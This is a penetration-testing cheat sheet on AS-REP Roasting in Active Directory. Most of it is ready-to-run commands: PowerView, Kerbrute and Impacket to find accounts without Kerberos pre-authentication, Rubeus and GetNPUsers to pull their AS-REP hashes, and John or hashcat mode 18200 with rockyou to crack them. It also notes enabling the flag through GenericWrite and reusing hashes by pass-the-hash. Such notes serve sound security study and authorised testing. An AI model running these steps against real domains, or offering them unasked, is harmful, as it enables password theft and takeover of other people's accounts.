---
title: AS-REP Roasting
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
> [!Important]
> - If we are performing any of the attacks from a **Linux host**, we are not on a domain-joined computer so we have to **provide credentials**.
> - If we are from a **Windows host** that is domain-joined, we **dont need** to **provide credentials** as the tools will automatically enumerate vulnerable users and obtain their hashes.

# AS-REP Roasting
Exploits Kerberos authentication protocol. In kerberos, the user first sends an AS-REQ to the KDC (DC) and if the credentials are correct then the DC sends an AS_REP with the TGT (encrypted with the krbtgt secret key) and Session Key that is encrypted with the users password hash.

AS_REP Roasting exploit the fact that some users in the AD have the "do not require kerberos preauthentication" enabled. This allows to request the AS_REP impersonating any user without sending the AS_REQ with the users password (do not require kerberos pre-authentication).

> [!Requirements]
> Know the account name for the user without Kerberos pre-auth.

> [!Note]
> If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password.
> 
> Check [[AD ACL Enumeration and Abuse]] for enumerating these permissions.

**Enumerating AS-REP Roastable accounts**

> [!Note]
> We are identifying accounts with the `do not require kerberos preauthentication` enabled.

- Using PowerView:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1

PS> Get-DomainUser | where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" } (display AS_REP roastable users)

Alternative:
PS C:\> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

- Using LOTL tools:
```powershell
PS> Get-NetUser -PreauthNotRequired | select samaccountname, useraccountcontrol # list as-rep roastable accounts: Identify user accounts that have Pre-Authentication disabled
```

- Using Kerbrute (from Linux):
```powershell
$ kerbrute_linux_386 userenum -d DOMAIN_FQDN --dc DC_IP USER_WORDLIST -t 100 --downgrade
```

Use kerbrute with `--downgrade` flag to downgrade the hashing algorythm to RC4 and be able to crack hashes offline.

> [!Note]
> Kerbrute will retrieve automatically the AS-REP for any users found that do not require Kerberos pre-authentication.

- Using Impacket (from Linux):
```shell
C:\> net users /domain

$ GetNPUsers.py DOMAIN_FQDN/ -dc-ip DC_IP -no-pass -usersfile VALID_AD_USERLIST # unauthenticated enumeration (requires known valid users; unreliable)

$ impacket-GetNPUsers -dc-ip DC_IP DOMAIN_FQDN/USER # authenticated enumeration (do not require valid known users list; reliable)
*enter USER password*

Parameters:
-dc-ip: Domain Controller IP address
-usersfile: AS-REP roastable users list (must be valid)
-no-pass: do not specify a password (use with usersfile or -k)
-k: kerberos authentication
```

> [!Note]
> - Requires a domain user for authenticating into the domain.
> - Requires a list of valid users (if they dont exist it will just show an error and continue with the next user).
> - Hashes are retrieved in hashcat format.

**Exploiting AS-REP Roasting**

Using Rubeus - John The Ripper (Windows):
1. Exploit AS_REP roasting to extract password hashes:
```powershell
PS C:\> .\Rubeus.exe asreproast [/usr:USERNAME] /nowrap /outfile:HASH_FILE.txt

Parameters:
/user: roastable user (optional since rubeus detects automatically AS-REP Roastable accounts)
/outfile: file to store the hash
/nowrap: retrieve the formatted hash for offline cracking
```

2. Crack the hashes offline:
```powershell
PS> .\john.exe HASH_FILE.txt --format=krb5asrep --wordlist WORDLIST

Parameters:
--format= krb5asrep -> kerberos hash format
```

> [!Note]
> We can authenticate as this user using the plaintext password or the hash through PtH

Using Rubeus - hashcat (Windows):
1. Exploit AS_REP roasting to extract password hashes:
```powershell
PS C:\> .\Rubeus.exe asreproast [/user:USERNAME] /nowrap /format:hashcat /outfile:HASH_FILE.txt

Parameters:
/user: roastable user (optional if we are authenticated as a domain-joined user, since rubeus detects automatically AS-REP Roastable accounts)
/outfile: file to store the hash
/format: format of the hash
/nowrap: retrieve the formatted hash for offline cracking
```

2. Crack the hashes offline:
```shell
$ hashcat --help | grep -i "Kerberos" # check the hashcat mode
$ hashcat -m 18200 HASH_FILE WORDLIST
```

> [!Note]
> Check at the bottom of this page for the hashcat formats based on the extracted hash (RC4/AES)

Using Impacket (Linux):

> [!Requirements]
> Valid set of AD credentials are required since we are performing the attack from a host that is not domain-joined.

1. Extract the TGT ticket for AS-REP Roastable accounts in the domain (recommended):
```bash
$ impacket-GetNPUsers -dc-ip DC_IP -request -outputfile hashes.asreproast DOMAIN_FQDN/USER
*enter password*

Parameters:
-dc-ip: domain controller IP address
-request: request TGT ticket
-outputfile: name of the output file where the AS-REP hash will be stored
DOMAIN_FQDN/USER: AD user we have control over to enumerate the Domain
```

> [!Note]
> Extracted hashes are in hashcat format.

2. Check the hashcat mode:
```bash
$ hashcat --help | grep -i "Kerberos"
```

3. Crack the hash:
```bash
$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
